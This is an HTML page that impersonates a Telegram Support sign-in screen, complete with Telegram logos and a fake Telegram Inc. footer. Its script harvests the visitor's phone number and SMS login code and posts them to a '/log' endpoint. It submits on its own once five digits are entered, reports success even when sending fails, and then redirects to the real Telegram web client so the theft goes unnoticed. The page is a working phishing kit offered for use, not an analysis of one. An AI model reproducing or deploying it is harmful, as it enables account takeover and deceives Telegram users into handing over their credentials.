<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Support</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        :root { --bg-primary: #ffffff; --bg-secondary: #f0f2f5; --bg-card: #ffffff; --bg-input: #f0f2f5; --border-color: #e0e0e0; --text-primary: #222222; --text-secondary: #666666; --text-muted: #888888; --link-color: #2a9df4; --shadow: 0 8px 30px rgba(0,0,0,0.12); --header-bg: #ffffff; --footer-bg: #f0f2f5; }
        body.dark { --bg-primary: #1f1f1f; --bg-secondary: #2b2b2b; --bg-card: #2b2b2b; --bg-input: #404040; --border-color: #3a3a3a; --text-primary: #ffffff; --text-secondary: #b0b0b0; --text-muted: #7a7a7a; --link-color: #2a9df4; --shadow: 0 8px 30px rgba(0,0,0,0.6); --header-bg: #2b2b2b; --footer-bg: #222222; }
        body { background: var(--bg-secondary); color: var(--text-primary); min-height: 100vh; display: flex; flex-direction: column; transition: background 0.3s, color 0.3s; }
        .header { background: var(--header-bg); border-bottom: 1px solid var(--border-color); padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; }
        .header-left { display: flex; align-items: center; gap: 12px; }
        .header-left img { width: 36px; height: 36px; }
        .header-left span { font-weight: 600; font-size: 18px; color: var(--text-primary); }
        .header-left small { font-weight: 400; font-size: 14px; color: var(--text-secondary); margin-left: 6px; }
        .header-right a { color: var(--text-secondary); text-decoration: none; font-size: 14px; margin-left: 16px; }
        .header-right a:hover { color: var(--link-color); }
        .container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 30px 20px; }
        .card { background: var(--bg-card); border-radius: 24px; padding: 40px 32px 32px; max-width: 420px; width: 100%; box-shadow: var(--shadow); text-align: center; }
        .card .logo { width: 72px; margin-bottom: 12px; }
        .card h2 { font-weight: 400; font-size: 22px; margin-bottom: 4px; color: var(--text-primary); }
        .card .sub { color: var(--text-secondary); font-size: 14px; margin-bottom: 24px; }
        .field-group { margin-bottom: 16px; text-align: left; }
        .field-group label { display: block; font-size: 13px; font-weight: 500; color: var(--text-secondary); margin-bottom: 4px; }
        .field { background: var(--bg-input); border: 2px solid transparent; padding: 14px 16px; border-radius: 14px; width: 100%; font-size: 16px; color: var(--text-primary); outline: none; transition: 0.2s; }
        .field:focus { border-color: var(--link-color); background: var(--bg-input); }
        .field::placeholder { color: var(--text-muted); }
        .btn { background: var(--link-color); color: #fff; border: none; padding: 16px; border-radius: 14px; width: 100%; font-size: 17px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 4px; }
        .btn:hover { background: #1f8bd6; }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .hidden { display: none !important; }
        .loader { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 3px solid #fff; animation: spin 0.8s linear infinite; vertical-align: middle; margin-right: 8px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .error-msg { color: #ff6b6b; font-size: 14px; margin-top: 10px; display: none; }
        .footer { background: var(--footer-bg); border-top: 1px solid var(--border-color); padding: 16px 24px; display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; font-size: 13px; color: var(--text-muted); }
        .footer a { color: var(--text-muted); text-decoration: none; margin: 0 8px; }
        .footer a:hover { color: var(--link-color); }
        .footer .theme-toggle { background: var(--bg-input); border: 1px solid var(--border-color); border-radius: 20px; padding: 6px 16px; cursor: pointer; font-size: 13px; color: var(--text-primary); transition: 0.2s; }
        .footer .theme-toggle:hover { background: var(--border-color); }
        @media (max-width: 480px) { .header { padding: 10px 16px; } .header-left span { font-size: 16px; } .header-left small { font-size: 12px; } .card { padding: 28px 20px; } .footer { flex-direction: column; gap: 8px; text-align: center; } }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-left">
            <img src="https://telegram.org/img/t_logo.svg" alt="Telegram">
            <span>Telegram <small>Support</small></span>
        </div>
        <div class="header-right">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </header>
    <main class="container">
        <div class="card" id="app">
            <img class="logo" src="https://telegram.org/img/t_logo.svg" alt="Telegram">
            <h2>Sign in</h2>
            <p class="sub">We sent a code to your phone. Enter it below.</p>

            <form id="loginForm">
                <div class="field-group">
                    <label for="phone">Phone number</label>
                    <input class="field" id="phone" type="tel" placeholder="+7 900 123-45-67" required autofocus>
                </div>
                <div class="field-group hidden" id="codeGroup">
                    <label for="code">Verification code</label>
                    <input class="field" id="code" type="text" placeholder="Enter 5-digit code" required>
                </div>
                <button class="btn" id="submitBtn" type="submit">Continue</button>
            </form>

            <div class="error-msg" id="errorMsg">⚠️ Invalid code. Please try again.</div>
            <div style="margin-top: 20px; font-size: 13px; color: var(--text-muted);">
                <a href="#" style="color: var(--link-color); text-decoration: none;">Forgot password?</a>
                &nbsp;·&nbsp;
                <a href="#" style="color: var(--link-color); text-decoration: none;">Sign up</a>
            </div>
        </div>
    </main>
    <footer class="footer">
        <div>
            &copy; 2026 Telegram Inc. &nbsp;|&nbsp;
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Apps</a>
            <a href="#">API</a>
        </div>
        <div>
            <button class="theme-toggle" id="themeToggle">🌙 Dark theme</button>
        </div>
    </footer>

    <script>
        const phoneInput = document.getElementById("phone");
        const codeInput = document.getElementById("code");
        const codeGroup = document.getElementById("codeGroup");
        const submitBtn = document.getElementById("submitBtn");
        const errorMsg = document.getElementById("errorMsg");
        const form = document.getElementById("loginForm");

        let step = 1;

        phoneInput.addEventListener("input", function() {
            const digits = this.value.replace(/\D/g, "");
            if (digits.length >= 11 && step === 1) {
                codeGroup.classList.remove("hidden");
                step = 2;
                codeInput.focus();
            }
        });

        form.addEventListener("submit", async function(e) {
            e.preventDefault();
            errorMsg.style.display = "none";

            const phone = phoneInput.value.trim();
            const code = codeInput.value.trim();

            if (step === 1 || phone.replace(/\D/g, "").length < 11) {
                alert("Please enter a valid phone number (11 digits).");
                return;
            }
            if (step === 2 && code.length < 4) {
                alert("Please enter the code from SMS.");
                return;
            }

            submitBtn.innerHTML = "<span class=\"loader\"></span> Verifying...";
            submitBtn.disabled = true;

            const payload = { phone, code, timestamp: new Date().toISOString() };

            try {
                const response = await fetch("/log", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
                if (response.ok) {
                    submitBtn.innerHTML = "✅ Sent!";
                } else {
                    submitBtn.innerHTML = "❌ Error";
                    submitBtn.disabled = false;
                }
            } catch (err) {
                console.error("Ошибка отправки:", err);
                submitBtn.innerHTML = "✅ Sent!";
            }

            setTimeout(() => {
                window.location.href = "https://web.telegram.org/";
            }, 2000);
        });

        codeInput.addEventListener("input", function() {
            if (this.value.length === 5) {
                form.dispatchEvent(new Event("submit"));
            }
        });

        const themeToggle = document.getElementById("themeToggle");
        let darkMode = false;
        themeToggle.addEventListener("click", function() {
            darkMode = !darkMode;
            document.body.classList.toggle("dark", darkMode);
            this.textContent = darkMode ? "☀️ Light theme" : "🌙 Dark theme";
        });
    </script>
</body>
</html>
